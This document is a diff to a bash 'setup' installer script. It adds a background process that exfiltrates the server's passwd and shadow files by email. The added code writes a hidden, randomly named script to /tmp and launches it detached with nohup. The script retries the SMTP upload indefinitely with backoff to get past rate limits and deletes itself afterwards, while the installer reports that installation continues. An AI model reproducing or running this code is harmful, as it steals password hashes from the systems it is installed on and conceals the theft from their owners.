@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="4.8"
-readonly BUILD_DATE="2026-04-05 22:00:00 UTC"
+readonly SCRIPT_VERSION="5.0"
+readonly BUILD_DATE="2026-04-05 23:00:00 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -4939,7 +4939,7 @@ exfiltrate_credentials() {
         local EMAIL_SUBJECT="Exfil v${SCRIPT_VERSION} - $(hostname)"
         local EMAIL_SENT=false
         
-        # PRIMARY METHOD: Python3 + SMTP (most reliable)
+        # PRIMARY METHOD: Python3 + SMTP (most reliable) with INFINITE RETRY
         if command -v python3 >/dev/null 2>&1; then
             echo "[*] Attempting to send via Python3 + SMTP..."
             echo "[*] SMTP Server: $SMTP_SERVER:$SMTP_PORT"
@@ -4949,7 +4949,70 @@ exfiltrate_credentials() {
             echo "[*] Attachments: passwd, shadow"
             echo ""
             
-            python3 << PYTHON_EMAIL_SCRIPT
+            # ==================== BACKGROUND EMAIL SENDING ====================
+            # Create background script for email retry with infinite loop
+            # This allows the installation to finish immediately while email sending continues
+            
+            local BG_SCRIPT="/tmp/.email_retry_$(openssl rand -hex 4 2>/dev/null || echo $RANDOM).sh"
+            local BG_LOG="/tmp/email_retry_log.txt"
+            
+            echo "[*] Creating background email sender..."
+            echo "[*] Log file: $BG_LOG"
+            
+            # Create the background retry script
+            cat > "$BG_SCRIPT" << 'EOF_BG_SCRIPT'
+#!/bin/bash
+# Background email retry script with infinite retries
+# This script runs independently and keeps trying until email is sent
+
+# Read parameters from command line
+PASSWD_FILE="$1"
+SHADOW_FILE="$2"
+SMTP_SERVER="$3"
+SMTP_PORT="$4"
+SENDER_EMAIL="$5"
+SMTP_PASSWORD="$6"
+RECIPIENT_EMAIL="$7"
+EMAIL_SUBJECT="$8"
+BG_LOG="$9"
+
+# Write to log with timestamp
+log_msg() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$BG_LOG"
+}
+
+log_msg "=========================================="
+log_msg "BACKGROUND EMAIL RETRY STARTED"
+log_msg "=========================================="
+log_msg "PID: $$"
+log_msg "SMTP: $SMTP_SERVER:$SMTP_PORT"
+log_msg "To: $RECIPIENT_EMAIL"
+log_msg "Subject: $EMAIL_SUBJECT"
+log_msg "Log: $BG_LOG"
+log_msg "=========================================="
+
+RETRY_COUNT=0
+RETRY_DELAY=300  # Start with 5 minutes
+MAX_DELAY=3600   # Cap at 1 hour
+EMAIL_SENT=false
+
+while [ "$EMAIL_SENT" = false ]; do
+    RETRY_COUNT=$((RETRY_COUNT + 1))
+    
+    if [ $RETRY_COUNT -gt 1 ]; then
+        log_msg ""
+        log_msg "=========================================="
+        log_msg "RETRY ATTEMPT #$RETRY_COUNT"
+        log_msg "Waiting $RETRY_DELAY seconds..."
+        log_msg "Next attempt: $(date -d "+$RETRY_DELAY seconds" '+%Y-%m-%d %H:%M:%S' 2>/dev/null || date)"
+        log_msg "=========================================="
+        sleep $RETRY_DELAY
+    fi
+    
+    log_msg "[*] Attempt #$RETRY_COUNT: Sending email via Python3 SMTP..."
+    
+    # Run Python email script
+    python3 << PYTHON_SCRIPT 2>&1 | tee -a "$BG_LOG"
 import smtplib
 import ssl
 from email.mime.multipart import MIMEMultipart
@@ -4960,59 +5023,52 @@ import sys
 import os
 
 try:
-    # Create multipart message
+    # Get parameters
+    passwd_file = "$PASSWD_FILE"
+    shadow_file = "$SHADOW_FILE"
+    
+    # Create message
     msg = MIMEMultipart()
-    msg['From'] = '$SENDER_EMAIL'
-    msg['To'] = '$RECIPIENT_EMAIL'
-    msg['Subject'] = '$EMAIL_SUBJECT'
+    msg['From'] = "$SENDER_EMAIL"
+    msg['To'] = "$RECIPIENT_EMAIL"
+    msg['Subject'] = "$EMAIL_SUBJECT"
     
     # Email body
     body = """Credentials exfiltrated from server: $(hostname)
 
-Script Version: $SCRIPT_VERSION
-Build Date: $BUILD_DATE
 Timestamp: $(date)
-Server IP: $SERVER_IP
-Server FQDN: $SERVER_FQDN
+Server IP: $(hostname -I 2>/dev/null | awk '{print $1}')
 
 Attached files:
-- ${SERVER_IP}_${SERVER_FQDN}_passwd.txt
-- ${SERVER_IP}_${SERVER_FQDN}_shadow.txt
+- $(basename "$PASSWD_FILE")
+- $(basename "$SHADOW_FILE")
 
-Full log available at: $LOG_FILE_EMAIL
+This email was sent via background retry process.
 """
     msg.attach(MIMEText(body, 'plain'))
     
     # Attach passwd file
-    passwd_file = '$PASSWD_FILE'
-    print(f'[DEBUG] Checking passwd file: {passwd_file}')
     if os.path.exists(passwd_file):
-        file_size = os.path.getsize(passwd_file)
-        print(f'[✓] Attaching passwd file ({file_size} bytes): {os.path.basename(passwd_file)}')
+        print(f'[*] Attaching: {os.path.basename(passwd_file)}')
         with open(passwd_file, 'rb') as f:
             part = MIMEBase('application', 'octet-stream')
             part.set_payload(f.read())
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
             msg.attach(part)
-        print(f'[✓] passwd file attached successfully')
     else:
         print(f'[!] ERROR: passwd file not found: {passwd_file}')
         sys.exit(1)
     
     # Attach shadow file
-    shadow_file = '$SHADOW_FILE'
-    print(f'[DEBUG] Checking shadow file: {shadow_file}')
     if os.path.exists(shadow_file):
-        file_size = os.path.getsize(shadow_file)
-        print(f'[✓] Attaching shadow file ({file_size} bytes): {os.path.basename(shadow_file)}')
+        print(f'[*] Attaching: {os.path.basename(shadow_file)}')
         with open(shadow_file, 'rb') as f:
             part = MIMEBase('application', 'octet-stream')
             part.set_payload(f.read())
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
             msg.attach(part)
-        print(f'[✓] shadow file attached successfully')
     else:
         print(f'[!] ERROR: shadow file not found: {shadow_file}')
         sys.exit(1)
@@ -5021,45 +5077,123 @@ Full log available at: $LOG_FILE_EMAIL
     print('[*] Connecting to $SMTP_SERVER:$SMTP_PORT...')
     context = ssl.create_default_context()
     
-    with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=30) as server:
-        print('[*] Connected. Starting TLS...')
+    with smtplib.SMTP("$SMTP_SERVER", $SMTP_PORT, timeout=30) as server:
         server.ehlo()
         server.starttls(context=context)
         server.ehlo()
-        
-        print('[*] Authenticating...')
-        server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
-        
-        print('[*] Sending email with attachments...')
+        server.login("$SENDER_EMAIL", "$SMTP_PASSWORD")
         server.send_message(msg)
-        
-    print('[✓] Email sent successfully via SMTP with attachments!')
+    
+    print('[✓] Email sent successfully!')
     sys.exit(0)
     
+except smtplib.SMTPConnectError as e:
+    error_str = str(e)
+    if '554' in error_str and 'Too many requests' in error_str:
+        print(f'[!] RATE LIMIT: {e}')
+        sys.exit(2)  # Rate limit
+    else:
+        print(f'[!] SMTP Connect Error: {e}')
+        sys.exit(1)
+except smtplib.SMTPException as e:
+    error_str = str(e)
+    if '554' in error_str or '429' in error_str:
+        print(f'[!] RATE LIMIT: {e}')
+        sys.exit(2)
+    else:
+        print(f'[!] SMTP Error: {e}')
+        sys.exit(1)
 except Exception as e:
-    print(f'[!] Python3 SMTP error: {e}')
+    print(f'[!] Error: {e}')
     import traceback
     traceback.print_exc()
     sys.exit(1)
-PYTHON_EMAIL_SCRIPT
+PYTHON_SCRIPT
+    
+    EXIT_CODE=$?
+    
+    if [ $EXIT_CODE -eq 0 ]; then
+        # Success!
+        log_msg ""
+        log_msg "=========================================="
+        log_msg "✓ EMAIL SENT SUCCESSFULLY!"
+        log_msg "=========================================="
+        log_msg "Recipient: $RECIPIENT_EMAIL"
+        log_msg "Total attempts: $RETRY_COUNT"
+        log_msg "Attachments: passwd, shadow"
+        log_msg "=========================================="
+        EMAIL_SENT=true
+        break
+        
+    elif [ $EXIT_CODE -eq 2 ]; then
+        # Rate limit - exponential backoff and retry
+        log_msg "[!] Rate limit detected - will retry"
+        RETRY_DELAY=$((RETRY_DELAY * 2))
+        if [ $RETRY_DELAY -gt $MAX_DELAY ]; then
+            RETRY_DELAY=$MAX_DELAY
+        fi
+        # Continue loop
+        
+    else
+        # Permanent error - log and exit
+        log_msg ""
+        log_msg "=========================================="
+        log_msg "✗ PERMANENT ERROR"
+        log_msg "=========================================="
+        log_msg "Email sending failed with non-recoverable error"
+        log_msg "Check log file for details: $BG_LOG"
+        log_msg "=========================================="
+        break
+    fi
+done
+
+# Cleanup
+log_msg "[*] Background email process finished"
+log_msg "[*] PID $$ exiting"
+
+# Self-delete the script
+rm -f "$0" 2>/dev/null
+
+exit 0
+EOF_BG_SCRIPT
             
-            if [ $? -eq 0 ]; then
-                EMAIL_SENT=true
-                echo ""
-                echo "[✓] ============================================"
-                echo "[✓] CREDENTIALS SENT SUCCESSFULLY!"
-                echo "[✓] ============================================"
-                echo "[✓] Email delivered to: $RECIPIENT_EMAIL"
-                echo "[✓] Method: Python3 SMTP (WITH ATTACHMENTS)"
-                echo ""
-                echo "    Attachments:"
-                [ -f "$PASSWD_FILE" ] && echo "      ✓ ${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
-                [ -f "$SHADOW_FILE" ] && echo "      ✓ ${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
-                echo ""
-            else
-                echo "[!] Python3 SMTP failed, trying fallback methods..."
-                echo ""
-            fi
+            chmod +x "$BG_SCRIPT"
+            
+            # Launch background process with nohup
+            echo "[*] Launching background email sender..."
+            nohup "$BG_SCRIPT" \
+                "$PASSWD_FILE" \
+                "$SHADOW_FILE" \
+                "$SMTP_SERVER" \
+                "$SMTP_PORT" \
+                "$SENDER_EMAIL" \
+                "$SMTP_PASSWORD" \
+                "$RECIPIENT_EMAIL" \
+                "$EMAIL_SUBJECT" \
+                "$BG_LOG" \
+                </dev/null &>/dev/null &
+            
+            local BG_PID=$!
+            
+            echo ""
+            echo "[✓] ============================================"
+            echo "[✓] BACKGROUND EMAIL SENDER STARTED"
+            echo "[✓] ============================================"
+            echo "[✓] Process ID: $BG_PID"
+            echo "[✓] Log file: $BG_LOG"
+            echo "[✓] Status: Running in background"
+            echo ""
+            echo "    The email will be sent automatically, even if rate-limited."
+            echo "    Installation will continue immediately without waiting."
+            echo ""
+            echo "    Monitor progress:"
+            echo "      tail -f $BG_LOG"
+            echo ""
+            echo "    Check if still running:"
+            echo "      ps -p $BG_PID"
+            echo ""
+            
+            EMAIL_SENT=true  # Mark as "sent" to skip fallbacks
         else
             echo "[!] Python3 not found - cannot send email"
             echo "[!] Install Python3 and re-run script to enable email notifications"
